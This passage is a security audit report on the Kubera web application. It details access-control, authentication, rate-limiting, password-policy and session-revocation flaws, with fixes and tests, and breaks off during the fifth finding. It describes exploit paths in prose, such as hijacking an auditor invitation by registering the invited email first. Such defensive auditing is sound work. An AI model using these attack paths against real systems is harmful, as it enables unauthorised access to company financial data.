# Kubera — Security, Deployment & Authorization Audit

**Date:** 2026-09-01
**Branch:** `devsecops` @ `19ebbec`
**Auditor:** Claude (Opus 5), commissioned review
**Baseline:** `unit_tests` 354/354 passing at time of audit

---

## 0. How to read this document

Every finding carries an ID (`KUB-0xx`), a severity, a **status**, and a
**confidence**. Those last two matter:

- **Status `NEW`** — not previously recorded anywhere in the repository.
- **Status `KNOWN`** — already documented in `docs/SECURITY_HARDENING.md` §10
  ("Known limitations"). Repeated here for completeness, with a note on anything
  the existing entry does not cover.

- **Confidence `CONFIRMED`** — demonstrated by reading the code path end to end,
  and where relevant proven empirically (the commands are in Appendix C).
- **Confidence `LATENT`** — the defect is real, but a second condition currently
  prevents exploitation. These are called out explicitly rather than inflated.
  They are still worth fixing: the mitigating condition is incidental, not designed.

Nothing in this document is speculative. Where a suspected issue turned out
**not** to be exploitable, it is recorded in §5 (Verified clean) instead of being
quietly dropped — the negative results are as useful as the positive ones.

---

## 1. Scope and method

### 1.1 In scope

| Area | Coverage |
|---|---|
| API surface | All **214** application endpoints across 23 routers, enumerated by introspecting the live FastAPI app (Appendix A) |
| Authentication | JWT issue/verify/refresh, both principal types, activation, password lifecycle |
| Authorization | Role gates, module gates, tenant scoping, row-level visibility, auditor grants |
| Cryptography | Envelope encryption (root KEK → company KEK → per-file DEK), password hashing, token signing, key rotation |
| File storage | Upload, encryption at rest, retrieval, deletion, avatars, logos, audit attachments |
| Injection | SQL, XSS (stored + reflected), SSRF, CSRF, path traversal, header injection, formula injection |
| Session handling | Token storage, lifetime, refresh, revocation, logout |
| Rate limiting | Coverage, keying, bypass, fail-mode |
| Containers | `Dockerfile`, `gateway/Dockerfile`, `frontend/Dockerfile`, `docker-compose.yml`, `.dockerignore` |
| Edge / networking | `Caddyfile`, `gateway/nginx.conf`, `gateway/modes/*`, `frontend/nginx.conf`, network segmentation, published ports |
| Deployment & hosting | Startup sequence, secrets handling, health checks, resource limits, image provenance |
| Migrations | All 41 Alembic revisions, chain integrity, transactional safety, model/DB drift |
| Backups & DR | `nightly_backup`, retention, `ops/kubera-export.sh`, `ops/kubera-import.sh`, `ops/kubera-migrate.sh` |
| Frontend | Token storage, API client, auth guards, XSS sinks |

### 1.2 Explicitly out of scope

- **Upload size limits.** Deferred by the requester; already tracked as
  `SECURITY_HARDENING.md` §10.5. Two *adjacent* issues that are **not** the size
  limit are still reported: in-memory spreadsheet parsing (`KUB-L04`) and the
  absence of streaming encryption.
- Penetration testing against a live deployment. This is a source-level audit
  plus targeted local reproduction.
- Dependency CVE scanning (`uv.lock` was not audited against advisory databases).
- Business-logic correctness of accounting calculations (depreciation maths,
  trial-balance sign conventions).

### 1.3 Method

1. Full-tree inventory and read of every security-relevant module.
2. Programmatic enumeration of all routes and their resolved dependency chains,
   including recovery of `require_role` / `require_module` closure arguments, so
   the authorization matrix in Appendix A is derived from the running app rather
   than from grep.
3. Targeted grep sweeps for each injection class against known sink patterns.
4. **Empirical reproduction** of the two injection classes where framework
   behaviour, not application code, decides exploitability (Appendix C).
5. Cross-reference against `docs/SECURITY_HARDENING.md` to separate new findings
   from accepted risk.

---

## 2. Severity model

| Severity | Definition |
|---|---|
| **Critical** | Cross-tenant data exposure, authentication bypass, or full compromise reachable by a low-privileged or unauthenticated actor. |
| **High** | Privilege escalation within a tenant, control bypass, credential attack, server-side request forgery, or loss of a security-relevant guarantee (revocation, integrity of statutory records). |
| **Medium** | Requires a precondition, elevated privilege, or user interaction; or a defence-in-depth control that is absent, degraded, or silently reverted. |
| **Low** | Hardening gaps, robustness bugs, error-handling defects, and maintainability risks with security relevance. |

---

## 3. Findings summary

| ID | Sev | Status | Title |
|---|---|---|---|
| [KUB-001](#kub-001) | Critical | NEW | Module access control enforced only in the browser for 7 of 10 modules |
| [KUB-002](#kub-002) | Critical | NEW | Auditor invitations authenticated only by knowledge of an email address |
| [KUB-003](#kub-003) | High | NEW | `/auth/auditor/login` has no rate limiting |
| [KUB-004](#kub-004) | High | NEW | No password complexity or length floor on two of three creation paths |
| [KUB-005](#kub-005) | High | NEW | No session revocation mechanism of any kind |
| [KUB-006](#kub-006) | High | NEW | Tenant-configurable SSRF via SMTP verification |
| [KUB-007](#kub-007) | High | NEW | DocVault approval workflow bypass and unrestricted document mass-assignment |
| [KUB-008](#kub-008) | High | NEW | Financial-year and depreciation controls inconsistently gated |
| [KUB-009](#kub-009) | Medium | NEW | `inline` disposition with client-supplied Content-Type (latent stored XSS) |
| [KUB-010](#kub-010) | Medium | KNOWN+ | `Content-Disposition` filename injection |
| [KUB-011](#kub-011) | Medium | NEW | Excel formula injection in all generated exports |
| [KUB-012](#kub-012) | Medium | NEW | `INTERNAL_API_KEY` entered and stored in the browser |
| [KUB-013](#kub-013) | Medium | NEW | Audit bucket silently downgrades `restricted` → `everyone` |
| [KUB-014](#kub-014) | Medium | NEW | Rate-limit key trusts client-supplied `X-Forwarded-For` |
| [KUB-015](#kub-015) | Medium | NEW | Backups unencrypted, unreplicated, and colocated with the data |
| [KUB-016](#kub-016) | Medium | NEW | Migration bundle ships ciphertext and its root key together |
| [KUB-017](#kub-017) | Medium | NEW | Non-transactional migrations + auto-migrate on container start |
| [KUB-018](#kub-018) | Medium | NEW | `UserRole` Python enum has drifted from the PostgreSQL enum |
| [KUB-019](#kub-019) | Medium | NEW | `assets` module guard incomplete — depreciation and financial years unguarded |
| [KUB-L01…L21](#9-low-severity-findings) | Low | mixed | 21 hardening, robustness and maintainability findings |

**Counts:** 2 Critical · 6 High · 11 Medium · 21 Low

---

## 4. Detailed findings

<a name="kub-001"></a>
### KUB-001 — Module access control enforced only in the browser for 7 of 10 modules

| | |
|---|---|
| **Severity** | Critical |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Broken access control (OWASP A01) |
| **Locations** | `app/auth.py:139-157`, `app/routers/docvault.py` (all), `app/routers/auditease.py` (all), `app/routers/sales.py`, `app/routers/kra.py`, `app/routers/notifications.py`, `app/routers/activity.py`, `frontend/src/auth/company/ModuleGuard.tsx` |

#### What is wrong

The server-side module gate exists and its own docstring states the problem it
was written to solve:

```python
# app/auth.py:139
def require_module(module_id: str):
    """Dependency factory: 403 unless the user has this module granted.

    `accessible_modules` was historically enforced only in the browser
    (ModuleGuard.tsx), which made it a UX affordance rather than a boundary.
    Endpoints that rely on it for authorization must use this. Admins always pass.
    """
```

That migration was **completed for only two of the ten modules**. Derived from
the live app (Appendix A):

| Module | Declared in `MODULE_DEFINITIONS` | Server-side gate | Endpoints unguarded |
|---|---|---|---|
| `assets` | yes | `require_module("assets")` on 32 endpoints | see [KUB-019](#kub-019) |
| `roc` | yes | router-level, 12 endpoints | 0 |
| `secretarial` | yes | router-level, 12 endpoints | 0 |
| `auditease` | yes | **none** | **31** |
| `docvault` | yes | **none** | **10** |
| `sales` | yes | **none** | **8** |
| `kra` | yes | **none** | **4** |
| `notifications` | yes | **none** | **2** |
| `activity` | yes | **none** | **1** |
| `dashboard` | yes | **none** | n/a (composed client-side) |

**56 endpoints** are reachable by any authenticated company user regardless of
their `accessible_modules` value. The only enforcement is
`frontend/src/auth/company/ModuleGuard.tsx`, which returns a `<Navigate>` — a
client-side redirect with no security value.

#### Impact

An employee provisioned with `accessible_modules: []` receives a fully valid
access token from `/api/v1/auth/company/login` and can then:

- **DocVault** — list, search, read metadata for, **download**, upload, re-version,
  re-bucket and archive every document in the company that is either
  uncategorised or in an `everyone` bucket. Note that
  `_document_bucket_filter` (`app/routers/docvault.py:108-113`) treats `bucket_id IS NULL` as
  visible to everyone, and `ensure_audit_bucket` forces audit buckets to
  `everyone` ([KUB-013](#kub-013)).
- **AuditEase** — read and mutate trial balances, ledger-group mappings,
  engagements, requirements, queries and audit entries; import and re-import
  trial balances; render and export financial reports.
- **Sales / KRA** — read own records and create new ones (row-level visibility
  via `get_visible_user_ids` still applies, so this is bounded to their own rows).
- **Activity log** — read the *entire company's* audit trail: every action by
  every user, including document titles and changed-field lists carried in
  `metadata_`. This is the most sensitive of the ungated reads because it
  aggregates activity the user has no other route to.
- **Notifications** — bounded to their own `recipient_id`; the missing gate has
  little practical effect here.

This defeats the entire purpose of the per-user module grants that the admin UI
(`UserModal.tsx`) presents as an access-control feature. A customer configuring a
least-privilege employee gets none of the isolation the interface promises.

#### Proposed fix

The correct pattern is already in the codebase. `compliance.py` applies the gate
at router construction, so it cannot be forgotten on a new endpoint:

```python
# app/routers/compliance.py:29-33  — the pattern to copy
def create_compliance_router(domain: ComplianceDomain, prefix: str, tags: List[str]) -> APIRouter:
    router = APIRouter(
        prefix=prefix,
        tags=tags,
        dependencies=[Depends(require_module(domain.value))],
    )
```

Apply it to each ungated router. For example, in `app/routers/docvault.py`:

```python
# BEFORE
router = APIRouter(prefix="/api/v1/docvault", tags=["docvault"])

# AFTER
router = APIRouter(
    prefix="/api/v1/docvault",
    tags=["docvault"],
    dependencies=[Depends(require_module("docvault"))],
)
```

Repeat for:

| File | Module id |
|---|---|
| `app/routers/docvault.py` | `docvault` |
| `app/routers/auditease.py` | `auditease` |
| `app/routers/sales.py` | `sales` |
| `app/routers/kra.py` | `kra` |
| `app/routers/notifications.py` | `notifications` |
| `app/routers/activity.py` | `activity` |

Add the module ids to `app/access_modules.py` as named constants rather than bare
strings, so the frontend `MODULE_DEFINITIONS` list and the backend gate cannot
drift:

```python
# app/access_modules.py
DASHBOARD_MODULE = "dashboard"
DOCVAULT_MODULE = "docvault"
SALES_MODULE = "sales"
ASSETS_MODULE = "assets"
KRA_MODULE = "kra"
AUDITEASE_MODULE = "auditease"
ROC_MODULE = "roc"
SECRETARIAL_MODULE = "secretarial"
NOTIFICATIONS_MODULE = "notifications"
ACTIVITY_MODULE = "activity"

ALL_MODULES = frozenset({
    DASHBOARD_MODULE, DOCVAULT_MODULE, SALES_MODULE, ASSETS_MODULE, KRA_MODULE,
    AUDITEASE_MODULE, ROC_MODULE, SECRETARIAL_MODULE, NOTIFICATIONS_MODULE,
    ACTIVITY_MODULE,
})
```

Then validate on write, so an admin cannot grant a module that does not exist —
currently `UserUpdate.accessible_modules: list[str] | None` accepts any string
and `normalize_accessible_modules` passes unknown values straight through:

```python
# app/access_modules.py — add
def validate_accessible_modules(modules: list[str]) -> list[str]:
    normalized = normalize_accessible_modules(modules)
    unknown = sorted(set(normalized) - ALL_MODULES)
    if unknown:
        raise ValueError(f"Unknown module ids: {', '.join(unknown)}")
    return normalized
```

#### Regression test

```python
# tests/test_module_enforcement.py
import pytest
from app.access_modules import ALL_MODULES

GATED_ROUTES = {
    "/api/v1/docvault": "docvault",
    "/api/v1/auditease": "auditease",
    "/api/v1/sales": "sales",
    "/api/v1/kra": "kra",
    "/api/v1/notifications": "notifications",
    "/api/v1/activity-log": "activity",
}

def test_every_module_router_has_a_server_side_gate():
    """A module listed in the UI must be enforced server-side, not just by
    ModuleGuard.tsx. See KUB-001."""
    from app.main import app
    from fastapi.security.http import HTTPBearer

    def guards(route):
        found = set()
        def walk(dep, depth=0):
            if depth > 5:
                return
            for sub in dep.dependencies:
                if getattr(sub.call, "__name__", "") == "checker":
                    for cell in (sub.call.__closure__ or ()):
                        if isinstance(cell.cell_contents, str):
                            found.add(cell.cell_contents)
                walk(sub, depth + 1)
        if getattr(route, "dependant", None):
            walk(route.dependant)
        return found

    missing = []
    for route in app.routes:
        path = getattr(route, "path", "")
        for prefix, module in GATED_ROUTES.items():
            if path.startswith(prefix) and module not in guards(route):
                missing.append((path, module))
    assert not missing, f"endpoints missing their module gate: {missing}"
```

Plus a behavioural test per module: log in as an employee with
`accessible_modules=[]` and assert `403` on one read endpoint of each router.

#### Effort

Small and mechanical — six one-line router changes plus tests. Do this first.

**Deployment note:** this is a behaviour change for any existing user whose
`accessible_modules` does not reflect what they actually use. Before shipping,
run an audit query to find users who would newly lose access:

```sql
SELECT company_id, email, role, accessible_modules
FROM company_users
WHERE deleted_at IS NULL AND is_active AND role <> 'admin'
  AND NOT (accessible_modules ?& array['docvault','auditease']);
```

---

<a name="kub-002"></a>
### KUB-002 — Auditor invitations authenticated only by knowledge of an email address

| | |
|---|---|
| **Severity** | Critical |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Broken authentication / improper authorization (OWASP A01, A07) |
| **Locations** | `app/routers/auth.py:484-539`, `app/routers/auditease.py:1043-1081`, `app/services/document_access.py:143,162,188`, `app/routers/auditor_engagements.py:40-66` |

#### What is wrong

Auditor onboarding has **no secret and no email verification**. The chain:

1. A company admin invites an auditor by email
   (`auditease.py:1043`). If no `Auditor` row exists, a bare
   `PendingAuditorInvite(engagement_id, email)` row is created
   (`auditease.py:1081`). No token is minted.

2. The invitation email links to a plain registration form
   (`auditease.py:1114`):
   ```python
   action_url = f"{base_url}/auditor/register?email={encoded_email}"
   ```
   The email address is the only parameter. There is no signed token.

3. `POST /api/v1/auth/auditor/register` is **open self-registration** with no
   authentication (Appendix A confirms it is one of the 9 unauthenticated
   endpoints). On success it sweeps pending invites by email and converts each
   into a live grant (`app/routers/auth.py:521-535`):
   ```python
   pend_res = await db.execute(
       select(PendingAuditorInvite).where(
           func.lower(PendingAuditorInvite.email) == body.email.strip().lower()
       )
   )
   for pend in pend_res.scalars().all():
       db.add(AuditorEngagementGrant(
           auditor_id=auditor_obj.id,
           engagement_id=pend.engagement_id,
           status=GrantStatus.invited,
       ))
       await db.delete(pend)
   ```

4. `GrantStatus.invited` **already confers access** — acceptance is not required.
   Both the engagement gate and the document gate accept `invited`:
   ```python
   # app/routers/auditor_engagements.py:53
   AuditorEngagementGrant.status.in_([GrantStatus.invited, GrantStatus.accepted]),
   # app/services/document_access.py:143, 162, 188 — same predicate
   ```

5. Default permissions are **all areas enabled** when the invite omits an
   explicit payload (`app/services/auditor_access.py:17-18`):
   ```python
   if payload is None:
       return {a: True for a in AUDITOR_AREAS}
   ```

#### Exploit scenario

An attacker who learns or guesses the invited auditor's address — for a CA firm
this is typically a published contact address such as `audit@<firm>.in` —
registers at `/auditor/register` with that email before the real auditor does.
They immediately hold an `invited` grant with all areas enabled and can read:

- the engagement's full trial balance (`GET /api/v1/auditor/engagements/{id}/trial-balance`),
- all requirement requests and the company's uploaded responses,
- all queries and query messages,
- and **download every attached document** via
  `GET /api/v1/auditor/documents/{document_id}/download`, which decrypts
  company-encrypted files server-side (`auditor_engagements.py:679-719`).

They can also write: create requirements, post query messages, and create audit
entries — injecting content into the company's audit record under the identity
the company believes is its auditor.

Secondary effect: the legitimate auditor is now **locked out**. Their address is
taken, `auditor_register` returns `409 Conflict`, and there is no recovery flow.

#### Aggravating factors

- **Case-sensitivity mismatch.** The existence check is case-**sensitive**
  (`app/routers/auth.py:495`: `select(Auditor).where(Auditor.email == body.email)`) while
  invite matching is case-**insensitive** (`app/routers/auth.py:525`). `Auditor.email` has a
  plain `unique=True` constraint on the raw string (`app/models/auditor.py:15`), so
  `a@x.com` and `A@x.com` can both exist. That also breaks the operator tooling
  — `account_admin.find_accounts` does
  `select(Auditor).where(func.lower(Auditor.email) == e)` followed by
  `.scalar_one_or_none()` (`account_admin.py:61-63`), which raises
  `MultipleResultsFound` → 500 in `change_password.py`.
- **`__pending__` takeover branch.** `app/routers/auth.py:499-506` lets anyone claim an
  existing auditor row whose `hashed_password == "__pending__"` by simply
  registering with that email. Nothing in the current codebase creates such a
  row (verified by grep — the only writers of `PENDING_PASSWORD` are the
  *company* admin paths), so this is currently dead code. It is a loaded gun:
  any future "pre-create the auditor on invite" change makes it a direct account
  takeover.
- No auditor account can be disabled (`Auditor` has no `is_active` — see
  [KUB-005](#kub-005)), so revocation is per-grant only.

#### Proposed fix

Mint a signed, single-use, expiring invite token bound to the engagement — the
same shape as the company activation key you already built and which is
well-designed (`app/routers/auth.py:67-74`).

**1. Add the token to the pending-invite model:**

```python
# app/models/auditease.py — PendingAuditorInvite
class PendingAuditorInvite(Base):
    __tablename__ = "pending_auditor_invites"
    # ... existing columns ...
    token_hash: Mapped[str] = mapped_column(String(255), nullable=False)
    expires_at: Mapped[datetime] = mapped_column(DateTime(timezone=True), nullable=False)
    consumed_at: Mapped[datetime | None] = mapped_column(DateTime(timezone=True), nullable=True)
```

**2. Mint on invite** (`auditease.py`, replacing the bare insert at line 1081):

```python
AUDITOR_INVITE_TTL = timedelta(days=7)

invite_token = secrets.token_urlsafe(32)
db.add(PendingAuditorInvite(
    engagement_id=engagement_id,
    email=email,
    token_hash=hash_password(invite_token),
    expires_at=datetime.now(timezone.utc) + AUDITOR_INVITE_TTL,
))
# and put the token in the link, not the email address:
action_url = f"{base_url}/auditor/register?token={urllib.parse.quote(invite_token)}"
```

**3. Require the token at registration.** `AuditorRegister` gains
`invite_token: str | None`, and the pending-invite sweep only converts invites
whose hash verifies:

```python
# app/routers/auth.py — replace the blind email sweep
pendings = (await db.execute(
    select(PendingAuditorInvite).where(
        func.lower(PendingAuditorInvite.email) == body.email.strip().lower(),
        PendingAuditorInvite.consumed_at.is_(None),
        PendingAuditorInvite.expires_at > datetime.now(timezone.utc),
    )
)).scalars().all()

matched = [
    p for p in pendings
    if body.invite_token and verify_password(body.invite_token, p.token_hash)
]
if pendings and not matched:
    # An invite exists for this address but the caller cannot prove they received
    # it. Do not create the account and do not confirm the invite's existence.
    raise HTTPException(status_code=400, detail="Invalid or expired invitation")

for pend in matched:
    db.add(AuditorEngagementGrant(
        auditor_id=auditor_obj.id,
        engagement_id=pend.engagement_id,
        status=GrantStatus.invited,
    ))
    pend.consumed_at = datetime.now(timezone.utc)
```

**4. Normalise auditor emails.** Store lowercase and enforce a functional unique
index, mirroring what `company_users` already does
(`app/models/company.py:135-140`):

```python
# migration
op.execute("UPDATE auditors SET email = lower(email)")
op.drop_constraint("auditors_email_key", "auditors", type_="unique")
op.create_index("uq_auditors_email_lower", "auditors",
                [sa.text("lower(email)")], unique=True)
```
and make the lookups in `auditor_register` / `auditor_login` case-insensitive
(`func.lower(Auditor.email) == body.email.strip().lower()`).

**5. Remove the `__pending__` takeover branch** (`app/routers/auth.py:499-506`) — it is dead
code guarding a path that should never exist.

**6. Decide whether `invited` should grant read access.** Treating an unaccepted
invitation as live access is a deliberate-looking choice, but it means access
begins before the auditor has authenticated even once. Recommendation: restrict
data reads to `GrantStatus.accepted`, and let `invited` see only the engagement
stub needed to render the accept screen. That is a one-line change repeated at
four sites (`auditor_engagements.py:53`, `document_access.py:143,162,188`) but
needs a product decision, so it is separated from the fix above.

#### Regression test

```python
async def test_auditor_cannot_claim_invite_without_token(client, engagement, invited_email):
    """KUB-002: knowing the invited address must not be sufficient."""
    r = await client.post("/api/v1/auth/auditor/register", json={
        "email": invited_email, "password": "Str0ng!Passw0rd", "name": "Impostor",
    })
    assert r.status_code == 400
    # and no grant was created
    grants = await count_grants(engagement.id)
    assert grants == 0

async def test_invite_token_is_single_use_and_expiring(...): ...
async def test_wrong_token_does_not_reveal_that_an_invite_exists(...): ...
```

#### Effort

Medium — one migration, one new column set, changes in two routers plus the
frontend registration page to read `?token=`. This is the highest-value fix after
KUB-001.

---

<a name="kub-003"></a>
### KUB-003 — `/auth/auditor/login` has no rate limiting

| | |
|---|---|
| **Severity** | High |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Insufficient anti-automation (OWASP A07) |
| **Locations** | `app/routers/auth.py:542-560`, `app/rate_limit.py`, `Caddyfile`, `gateway/nginx.conf` |

#### What is wrong

`enforce_rate_limit` has exactly **three** call sites in the entire application:

| Endpoint | Limit | Window | Source |
|---|---|---|---|
| `POST /api/v1/auth/company/login` | `LOGIN_RATE_LIMIT` (10) | 300s | `app/routers/auth.py:398` |
| `POST /api/v1/auth/company/activate` | `ACTIVATE_RATE_LIMIT` (10) | 900s | `app/routers/auth.py:232` |
| `POST /api/v1/leads/interest` | 3 | 600s | `leads.py:59` |

Everything else is unthrottled. Most significantly:

- **`POST /api/v1/auth/auditor/login`** — unauthenticated, no limit, no lockout,
  no backoff. Unlimited credential stuffing against accounts that hold audit
  data across multiple client companies.
- **`POST /api/v1/auth/auditor/register`** — unauthenticated, no limit. Account
  spam, and the enumeration oracle in [KUB-002](#kub-002).
- **`POST /api/v1/auth/company/refresh`** and **`/auth/auditor/refresh`** —
  unauthenticated (they take the token in the body), no limit.
- **All 7 `INTERNAL_API_KEY` endpoints** — including the hard delete of any
  company. The key has 64 characters of entropy so brute force is infeasible,
  but there is no lockout, no alerting, and no IP restriction (see
  [KUB-012](#kub-012)).
- **All 176 authenticated company endpoints** — no global limit. This matters for
  the expensive ones: WeasyPrint report rendering
  (`asset_reports.py`, `auditease.py:1623+`), spreadsheet import
  (`assets.py:340`, `auditease.py:276`), Excel export, and full-vault operations.
  An authenticated user can trivially saturate the API's 1 GB memory limit and
  the worker.

There is also **no edge-level limit**: `limit_req` / `limit_conn` are not
configured in `gateway/nginx.conf` or `frontend/nginx.conf`, and Caddy's
rate-limit module is not compiled into `caddy:2-alpine`.

Compounding factors covered separately: the limiter **fails open** on any Redis
error and its key trusts a client header ([KUB-014](#kub-014)).

#### Impact

Password-guessing against auditor accounts is unbounded. Combined with
[KUB-004](#kub-004) — auditor passwords have no complexity or length requirement
at all — a one-character password is both permitted and discoverable in a single
request.

#### Proposed fix

**1. Throttle the remaining auth endpoints.** Add to `app/routers/auth.py`:

```python
@router.post("/auditor/login", response_model=TokenResponse)
async def auditor_login(
    request: Request,                      # <- add
    body: LoginRequest,
    db: Annotated[AsyncSession, Depends(get_db)],
):
    settings = get_settings()
    await enforce_rate_limit(
        request, "auditor_login", body.email,
        limit=settings.LOGIN_RATE_LIMIT,
        window_seconds=settings.LOGIN_RATE_WINDOW,
    )
    ...
```

Do the same for `auditor_register` (a tighter limit — e.g. 5 per hour per IP) and
both refresh endpoints (keyed on IP alone, since the identifier is a token).

**2. Add per-IP throttling independent of the identifier.** The current key is
`rl:{scope}:{ip}:{identifier}`, so an attacker rotating the *email* gets a fresh
bucket each time — fine for guessing one account's password, but it does not
limit spraying one password across many accounts. Add a second, coarser counter:

```python
# app/rate_limit.py
async def enforce_rate_limit(request, scope, identifier, *, limit, window_seconds,
                             ip_limit: int | None = None, ip_window: int | None = None):
    ...
    # existing (ip, identifier) counter, then:
    if ip_limit is not None:
        ip_key = f"rl:{scope}:ip:{ip}"
        try:
            n = await r.incr(ip_key)
            if n == 1:
                await r.expire(ip_key, ip_window or window_seconds)
        except Exception:
            return
        if n > ip_limit:
            raise HTTPException(429, detail="Too many attempts. Please try again later.")
```

Call the login endpoints with `ip_limit=50, ip_window=300`.

**3. Reconsider fail-open for the auth endpoints.** The current comment
(`rate_limit.py:5`) says "throttling must never take down auth", which is a
defensible availability trade-off — but it means a Redis outage silently removes
all brute-force protection, and Redis runs with `maxmemory 200mb` +
`noeviction`, so filling it is a realistic way to reach that state. Suggested
middle ground: keep fail-open, but log at `ERROR` and increment a counter so the
condition is visible rather than silent:

```python
    except Exception:
        logger.error("rate limit store unavailable; failing open for scope=%s", scope)
        return
```

**4. Add an edge-level backstop.** In `gateway/nginx.conf`:

```nginx
# outside the server block (http context) — add to a new gateway/limits.conf
limit_req_zone $binary_remote_addr zone=api_general:10m rate=20r/s;
limit_req_zone $binary_remote_addr zone=api_auth:10m rate=1r/s;
limit_conn_zone $binary_remote_addr zone=api_conn:10m;
```
```nginx
# in gateway/modes/app.conf
location ^~ /api/v1/auth/ {
    limit_req zone=api_auth burst=10 nodelay;
    limit_req_status 429;
    # ... same proxy_pass block as /api/
}

location /api/ {
    limit_req zone=api_general burst=40 nodelay;
    limit_conn api_conn 20;
    ...
}
```

Note the `^~` prefix on the auth location: without it the existing regex
location `~* ^/(app|login|auditor|internal)` would not interfere, but `^~` makes
the precedence explicit and future-proof.

#### Effort

Small. The application-side change is four endpoints; the nginx change is one new
include.

---

<a name="kub-004"></a>
### KUB-004 — No password complexity or length floor on two of three creation paths

| | |
|---|---|
| **Severity** | High |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Identification and authentication failures (OWASP A07) |
| **Locations** | `app/schemas/auth.py:88-91`, `app/schemas/users.py:11-20`, `app/schemas/auth.py:58-63`, `app/services/user_security.py:12`, `app/services/account_admin.py:77-92` |

#### What is wrong

`validate_password_complexity` exists, is well written, and is called from
**exactly one place**:

```
$ grep -rn "validate_password_complexity" --include="*.py" . | grep -v tests
app/routers/users.py:203:        validate_password_complexity(body.new_password)
app/services/user_security.py:12:def validate_password_complexity(password: str) -> None:
```

Coverage by password-setting path:

| Path | Endpoint / caller | Length floor | Complexity |
|---|---|---|---|
| Self-service change | `POST /api/v1/users/me/change-password` | 8 (schema) | **yes** |
| Auditor self-registration | `POST /api/v1/auth/auditor/register` | **none** | **no** |
| Admin creates employee | `POST /api/v1/users` | **none** | **no** |
| Company admin activation | `POST /api/v1/auth/company/activate` | 8 (schema) | **no** |
| Operator script | `change_password.py` → `account_admin.set_password` | non-empty only | **no** |

The offending schemas:

```python
# app/schemas/auth.py:88
class AuditorRegister(BaseModel):
    email: EmailStr
    password: str          # <- no constraints whatsoever
    name: str

# app/schemas/users.py:11
class UserCreate(BaseModel):
    email: EmailStr
    password: str          # <- no constraints whatsoever
    ...
```

```python
# app/services/account_admin.py:79
    if not new_password:
        raise ValueError("password cannot be empty")
```

#### Impact

A one-character auditor password is accepted and stored. Combined with
[KUB-003](#kub-003) (no rate limit on auditor login) this is a direct path to
account compromise. Admin-created employee accounts have the same gap, and the
initial password is chosen by the admin and communicated out-of-band, so weak
values are likely in practice.

#### Proposed fix

Enforce the policy in **one place** — a shared Pydantic type — so no future
schema can omit it:

```python
# app/services/user_security.py — add
from typing import Annotated
from pydantic import AfterValidator

def _check(password: str) -> str:
    validate_password_complexity(password)   # raises ValueError; Pydantic -> 422
    return password

Password = Annotated[
    str,
    Field(min_length=PASSWORD_MIN_LENGTH, max_length=PASSWORD_MAX_LENGTH),
    AfterValidator(_check),
]
```

Then use it everywhere:

```python
# app/schemas/auth.py
from app.services.user_security import Password

class AuditorRegister(BaseModel):
    email: EmailStr
    password: Password
    name: str = Field(min_length=1, max_length=255)

class ActivationRequest(BaseModel):
    email: EmailStr
    activation_key: str
    password: Password
    full_name: str = Field(min_length=1, max_length=255)

# app/schemas/users.py
class UserCreate(BaseModel):
    email: EmailStr
    password: Password
    ...

class UserChangePasswordRequest(BaseModel):
    old_password: str = Field(..., min_length=1)
    new_password: Password
    confirm_password: Password
```

Once `new_password` is a `Password`, the explicit `try/except ValueError` block at
`users.py:202-208` becomes redundant and should be removed (Pydantic will return
a 422 with the same message).

And in the service layer, for the operator scripts:

```python
# app/services/account_admin.py
async def set_password(db, principal_type, account_id, new_password) -> None:
    validate_password_complexity(new_password)   # replaces the `if not new_password` check
    ...
```

#### Related note — bcrypt truncation

`PASSWORD_MAX_LENGTH = 128` is misleading: bcrypt silently truncates at **72
bytes**, so any two passwords sharing a 72-byte prefix are equivalent. This is
not exploitable in practice but the limit should either be lowered to 72 or the
input pre-hashed:

```python
# app/auth.py — if you want to keep the 128 limit honest
import hashlib, base64

def _prehash(password: str) -> bytes:
    """SHA-256 then base64 so the full password contributes, and no NUL byte can
    truncate the bcrypt input."""
    return base64.b64encode(hashlib.sha256(password.encode("utf-8")).digest())

def hash_password(password: str) -> str:
    return bcrypt.hashpw(_prehash(password), bcrypt.gensalt()).decode("utf-8")
```

**This change invalidates every existing hash** and would require a migration
strategy (e.g. a `hash_scheme` column, verifying old hashes with the old code
path and re-hashing on next successful login). Given that, lowering
`PASSWORD_MAX_LENGTH` to 72 is the pragmatic choice; the pre-hash is documented
here only so the trade-off is on record.

#### Effort

Small for the schema work. The bcrypt pre-hash is optional and should be a
separate, deliberate piece of work.

---

<a name="kub-005"></a>
### KUB-005 — No session revocation mechanism of any kind

| | |
|---|---|
| **Severity** | High |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Identification and authentication failures (OWASP A07) |
| **Locations** | `app/auth.py:33-66,100-121`, `app/routers/auth.py:445-470,563-586`, `app/models/auditor.py`, `frontend/src/api/http.ts:73-92`, `frontend/src/auth/tokenStorage.ts` |

#### What is wrong

Tokens are stateless and carry no revocation handle:

```python
# app/auth.py:37 — the entire access-token payload
payload = {
    "sub": str(subject_id),
    "principal_type": principal_type,
    "exp": expire,
    "type": "access",
}
```

There is no `jti`, no `iat`, no denylist table, and no `token_version` column on
either principal. Access tokens live 30 minutes; **refresh tokens live 7 days**
(`ACCESS_TOKEN_EXPIRE_MINUTES=30`, `REFRESH_TOKEN_EXPIRE_DAYS=7`).

Consequences, each independently verified:

**(a) Logout is client-side only.** `onAuthFailure` and the auth store clear
`localStorage`; the server is never told. A refresh token captured before logout
remains valid for its full 7 days.

**(b) Password change does not end other sessions.** `change_password`
(`users.py:210-224`) writes the new hash and an activity log, and nothing else.
The single most common incident-response action a user can take — "I think
someone has my password, let me change it" — does not evict the attacker.

**(c) The refresh endpoints do not re-check account state.** Compare login with
refresh:

```python
# company_login (app/routers/auth.py:417) — checks all three
if user is None or not user.is_active or not verify_password(...): reject
if company is None or company.archived_at is not None: reject
# and the query filters CompanyUser.deleted_at.is_(None)

# company_refresh (app/routers/auth.py:457-464) — checks only existence
user_id = uuid.UUID(payload["sub"])
user = (await db.execute(select(CompanyUser).where(CompanyUser.id == user_id))).scalar_one_or_none()
if user is None:
    raise HTTPException(401, "User not found")
return TokenResponse(access_token=..., refresh_token=..., role=user.role, full_name=user.full_name)
```

A deactivated, soft-deleted, or archived-company user can keep minting fresh
token pairs indefinitely, and each response leaks their current `role` and
`full_name`. The blast radius is bounded because `get_current_company_user`
(`app/auth.py:92`) does check `is_active`, so the resulting access token is refused —
but the endpoint should not be issuing it, and `deleted_at` is checked *nowhere*
in the request path.

